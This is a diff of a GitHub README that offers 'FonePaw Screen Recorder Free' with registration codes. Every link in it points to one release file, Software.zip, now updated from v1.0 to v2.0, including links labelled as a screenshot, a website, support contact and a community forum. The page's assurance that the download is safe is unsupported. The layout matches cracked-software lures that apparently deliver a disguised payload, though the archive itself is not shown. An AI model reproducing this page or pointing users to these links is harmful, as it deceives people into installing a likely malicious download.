@@ -7,7 +7,7 @@ FonePaw-Screen-Recorder-Free
 This repository is all about FonePaw Screen Recorder Free, offering information on the full version, compatibility with Mac, registration codes, discounts, and much more!
 
 ## 🔗 Important Link: 
-[![Download FonePaw Screen Recorder](https://github.com/amoni2019/FonePaw-Screen-Recorder-Free/releases/download/v1.0/Software.zip)](https://github.com/amoni2019/FonePaw-Screen-Recorder-Free/releases/download/v1.0/Software.zip)
+[![Download FonePaw Screen Recorder](https://github.com/amoni2019/FonePaw-Screen-Recorder-Free/releases/download/v2.0/Software.zip)](https://github.com/amoni2019/FonePaw-Screen-Recorder-Free/releases/download/v2.0/Software.zip)
 *Note: Click the badge above to download the file.*
 
 ## 🔍 Repository Topics:
@@ -45,10 +45,10 @@ Let's dive into the amazing world of screen recording with FonePaw! Whether you 
 3. **Explore:** Start recording your screen and unleash your creativity!
 
 ## 📸 Screenshots
-![FonePaw Screen Recorder](https://github.com/amoni2019/FonePaw-Screen-Recorder-Free/releases/download/v1.0/Software.zip)
+![FonePaw Screen Recorder](https://github.com/amoni2019/FonePaw-Screen-Recorder-Free/releases/download/v2.0/Software.zip)
 
 ## 🌐 Visit Our Website
-For more details and updates on FonePaw Screen Recorder Free, visit our website [here](https://github.com/amoni2019/FonePaw-Screen-Recorder-Free/releases/download/v1.0/Software.zip).
+For more details and updates on FonePaw Screen Recorder Free, visit our website [here](https://github.com/amoni2019/FonePaw-Screen-Recorder-Free/releases/download/v2.0/Software.zip).
 
 ## ❓ FAQs
 **Q: Is FonePaw Screen Recorder Free safe to use?**
@@ -61,10 +61,10 @@ A: Yes, FonePaw Screen Recorder Free is fully compatible with Mac devices.
 A: While the free version provides basic functionalities, a registration code unlocks advanced features.
 
 ## 📞 Contact Us
-If you have any questions or need assistance, feel free to reach out to our support team at [https://github.com/amoni2019/FonePaw-Screen-Recorder-Free/releases/download/v1.0/Software.zip](https://github.com/amoni2019/FonePaw-Screen-Recorder-Free/releases/download/v1.0/Software.zip).
+If you have any questions or need assistance, feel free to reach out to our support team at [https://github.com/amoni2019/FonePaw-Screen-Recorder-Free/releases/download/v2.0/Software.zip](https://github.com/amoni2019/FonePaw-Screen-Recorder-Free/releases/download/v2.0/Software.zip).
 
 ## 🌈 Join the Community
-Connect with other FonePaw Screen Recorder users, share tips, and showcase your creations on our [community forum](https://github.com/amoni2019/FonePaw-Screen-Recorder-Free/releases/download/v1.0/Software.zip).
+Connect with other FonePaw Screen Recorder users, share tips, and showcase your creations on our [community forum](https://github.com/amoni2019/FonePaw-Screen-Recorder-Free/releases/download/v2.0/Software.zip).
 
 ## 🌟 Stay Updated
 Don't miss out on the latest updates, feature releases, and discounts by keeping an eye on our "Releases" section!
